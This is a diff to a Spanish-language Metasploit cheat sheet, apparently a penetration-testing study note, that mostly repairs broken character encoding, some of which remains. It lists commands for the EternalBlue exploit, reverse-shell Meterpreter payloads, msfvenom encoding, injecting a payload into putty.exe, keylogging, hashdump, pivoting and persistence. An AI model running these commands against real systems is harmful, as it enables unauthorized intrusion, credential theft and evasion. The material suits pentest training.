@@ -1,9 +1,8 @@
-﻿# Metasploit Framework
+# Metasploit Framework
 
 > [!info] Herramienta
-> Framework de explotaciÃ³n mÃ¡s completo: exploits, payloads, Meterpreter, post-explotaciÃ³n y evasiÃ³n.
+> Framework de explotación más completo: exploits, payloads, Meterpreter, post-explotación y evasión.
 
-> â†’
 ## Inicio y Consola
 
 > [!tip] msfconsole
@@ -24,7 +23,7 @@ msfconsole -r setup.rc
 msfdb init
 msfdb status
 
-# Verificar conexiÃ³n DB
+# Verificar conexión DB
 db_status
 
 # Ayuda
@@ -34,14 +33,14 @@ help
 # Salir
 exit
 | ```
-## BÃºsqueda de MÃ³dulos
+## Búsqueda de Módulos
 
 > [!important] Encontrar exploits
 > Buscar por nombre, CVE, plataforma o tipo.
 
 ```bash
 
-# BÃºsqueda bÃ¡sica
+# Búsqueda básica
 search eternalblue
 
 # Filtrar por tipo y plataforma
@@ -56,17 +55,17 @@ search cve:2021
 # Auxiliares
 search type:auxiliary
 
-# Info de mÃ³dulo
+# Info de módulo
 info exploit/windows/smb/ms17_010_eternalblue
 ```
 
-### Filtros de BÃºsqueda
+### Filtros de Búsqueda
 
-| Filtro | DescripciÃ³n |
+| Filtro | Descripción |
 |--------|-------------|
 | `type:` | exploit, auxiliary, payload, post, encoder |
 | `platform:` | windows, linux, android, osx |
-| `name:` | Nombre del mÃ³dulo |
+| `name:` | Nombre del módulo |
 | `port:` | Puerto |
 | `rank:` | great, good, normal |
 | `date:` | Rango de fechas |
@@ -74,7 +73,7 @@ info exploit/windows/smb/ms17_010_eternalblue
 |----------------------------------|------------------------|
 ## Workspaces
 
-> [!note] OrganizaciÃ³n
+> [!note] Organización
 > Separar proyectos/engagements.
 
 ```bash
@@ -100,13 +99,13 @@ workspace -D
 
 ---
 
-## Exploits â€” SelecciÃ³n
+## Exploits â€” Selección
 
-| Comando | DescripciÃ³n |
+| Comando | Descripción |
 |---------|-------------|
-| `use <mÃ³dulo>` | Cargar mÃ³dulo |
-| `use <nÃºmero>` | Cargar por Ã­ndice de search |
-| `back` | Salir del mÃ³dulo |
+| `use <módulo>` | Cargar módulo |
+| `use <número>` | Cargar por índice de search |
+| `back` | Salir del módulo |
 | `show targets` | Objetivos compatibles |
 | `run` / `exploit` | Ejecutar |
 | `recheck` | Re-verificar vulnerabilidad |
@@ -115,7 +114,7 @@ workspace -D
 # Cargar exploit
 use exploit/windows/smb/ms17_010_eternalblue
 
-# O por nÃºmero
+# O por número
 search eternalblue
 use 0
 
@@ -127,15 +126,15 @@ exploit -j
 | ```
 ## Exploits â€” Opciones
 
-> [!warning] ConfiguraciÃ³n
+> [!warning] Configuración
 > Configurar opciones antes de ejecutar.
 
-| Comando | DescripciÃ³n |
+| Comando | Descripción |
 
-| `show options` | Ver opciones del mÃ³dulo |
-| `set <OPCIÃ“N> <valor>` | Configurar opciÃ³n |
+| `show options` | Ver opciones del módulo |
+| `set <OPCIÃ“N> <valor>` | Configurar opción |
 | `setg <OPCIÃ“N> <valor>` | Configurar global |
-| `unset <OPCIÃ“N>` | Limpiar opciÃ³n |
+| `unset <OPCIÃ“N>` | Limpiar opción |
 | `unsetg <OPCIÃ“N>` | Limpiar global |
 | `set PAYLOAD <payload>` | Seleccionar payload |
 
@@ -154,12 +153,12 @@ set LPORT 4444
 # Configurar payload
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 
-# OpciÃ³n global
+# Opción global
 setg LHOST 192.168.1.50
 | ```
-## MÃ³dulos Auxiliares
+## Módulos Auxiliares
 
-> [!note] Escaneo y enumeraciÃ³n
+> [!note] Escaneo y enumeración
 > No explotan, pero sirven para reconocimiento.
 
 ```bash
@@ -194,18 +193,18 @@ run
 ## Payloads
 
 > [!important] Tipos
-| Tipo | DescripciÃ³n |
+| Tipo | Descripción |
 |------|-------------|
-| `reverse_tcp` | ConexiÃ³n de vuelta al atacante (requiere LHOST/LPORT) |
+| `reverse_tcp` | Conexión de vuelta al atacante (requiere LHOST/LPORT) |
 | `bind_tcp` | Abre puerto en target (requiere RHOST/RPORT) |
 | `meterpreter` | Shell avanzada in-memory |
-| `shell` | Shell bÃ¡sica del sistema |
+| `shell` | Shell básica del sistema |
 
 ### Staged vs Stageless
 
-| Tipo | Ejemplo | DescripciÃ³n |
+| Tipo | Ejemplo | Descripción |
 |------|---------|-------------|
-| Staged | `reverse_tcp` (con `/`) | EnvÃ­a stager mÃ­nimo, descarga payload completo |
+| Staged | `reverse_tcp` (con `/`) | Envía stager mínimo, descarga payload completo |
 | Stageless | `reverse_tcp` (con `_`) | Payload completo en un solo binario |
 
 ```bash
@@ -215,10 +214,10 @@ show payloads
 # Seleccionar
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 | ```
-## msfvenom â€” GeneraciÃ³n de Payloads
+## msfvenom â€” Generación de Payloads
 
 > [!danger] Generar payloads
-> Fuera de msfconsole, pero la sesiÃ³n se recibe en msfconsole.
+> Fuera de msfconsole, pero la sesión se recibe en msfconsole.
 
 ```bash
 
@@ -234,21 +233,21 @@ msfvenom -l payloads
 # Con encoding
 msfvenom -p ... -e x86/shikata_ga_nai -i 5
 
-# Inyectar en binario legÃ­timo
+# Inyectar en binario legítimo
 msfvenom -p ... -x putty.exe -k -f exe -o payload.exe
 | ```
-## Meterpreter â€” Comandos BÃ¡sicos
+## Meterpreter â€” Comandos Básicos
 
 > [!tip] Shell avanzada
 > In-memory, no escribe en disco.
 
-| Comando | DescripciÃ³n |
+| Comando | Descripción |
 
 | `help` | Mostrar comandos |
 | `sysinfo` | Info del sistema |
 | `getuid` | Usuario actual |
 | `getsystem` | Escalar a SYSTEM |
-| `background` / `bg` | EnvÃ­a a segundo plano |
+| `background` / `bg` | Envía a segundo plano |
 | `shell` | Shell del sistema |
 
 ```bash
@@ -270,12 +269,12 @@ exit # vuelve a meterpreter
 
 ## Meterpreter â€” Archivos
 
-| Comando | DescripciÃ³n |
+| Comando | Descripción |
 |---------|-------------|
-| `ls` / `pwd` / `cd` | NavegaciÃ³n |
+| `ls` / `pwd` / `cd` | Navegación |
 | `upload <local> <remoto>` | Subir archivo |
 | `download <remoto> <local>` | Descargar archivo |
-| `search -f <patrÃ³n>` | Buscar archivos |
+| `search -f <patrón>` | Buscar archivos |
 | `cat <archivo>` | Ver contenido |
 | `rm` / `mkdir` / `edit` | Gestionar archivos |
 
@@ -295,7 +294,7 @@ search -f password*
 
 ## Meterpreter â€” Sistema
 
-| Comando | DescripciÃ³n |
+| Comando | Descripción |
 |---------|-------------|
 | `ps` | Listar procesos |
 | `migrate <PID>` | Migrar a proceso |
@@ -324,11 +323,11 @@ keyscan_stop
 
 ## Meterpreter â€” Red
 
-| Comando | DescripciÃ³n |
+| Comando | Descripción |
 |---------|-------------|
 | `ipconfig` / `ifconfig` | Interfaces de red |
 | `portfwd add -l <local> -p <remoto> -r <target>` | Port forwarding |
-| `route add <subred> <mÃ¡scara> <sesiÃ³n>` | Ruta para pivoting || `autoroute -s <subred>` | Auto-ruta |
+| `route add <subred> <máscara> <sesión>` | Ruta para pivoting || `autoroute -s <subred>` | Auto-ruta |
 | `arp` / `netstat` | Tabla ARP/conexiones |
 
 ```bash
@@ -344,9 +343,9 @@ autoroute -s 192.168.1.0/24
 
 ## Base de Datos
 
-| Comando | DescripciÃ³n |
+| Comando | Descripción |
 |---------|-------------|
-| `db_nmap <opciones> <target>` | Nmap con guardado automÃ¡tico |
+| `db_nmap <opciones> <target>` | Nmap con guardado automático |
 | `hosts` | Hosts descubiertos |
 | `services` | Servicios descubiertos |
 | `vulns` | Vulnerabilidades |
@@ -366,12 +365,12 @@ services -p 445
 
 ---
 
-## EvasiÃ³n
+## Evasión
 
-| Comando | DescripciÃ³n |
+| Comando | Descripción |
 |---------|-------------|
 | `show encoders` | Listar encoders |
-| `set EnableStageEncoding true` | Encoding automÃ¡tico |
+| `set EnableStageEncoding true` | Encoding automático |
 | `set EXITFUNC thread` | Salida segura |
 
 ```bash
@@ -385,7 +384,7 @@ set StageEncoder x64/xor
 
 ---
 
-## Post-ExplotaciÃ³n
+## Post-Explotación
 
 ```bash
 # Detectar VM
@@ -413,13 +412,12 @@ run post/windows/manage/persistence_exe
 
 #checklist
 - [ ] msfconsole iniciado y DB conectada
-- [ ] MÃ³dulos buscados con `search`
+- [ ] Módulos buscados con `search`
 - [ ] Exploit configurado con `set RHOSTS/RPORT/LHOST/LPORT`
 - [ ] Payload seleccionado y compatible
 - [ ] msfvenom para generar payloads standalone
 - [ ] Meterpreter: sysinfo, getuid, hashdump
 - [ ] Pivoting con autoroute y portfwd
-- [ ] Post-explotaciÃ³n con mÃ³dulos post/
+- [ ] Post-explotación con módulos post/
 
-â†’
 
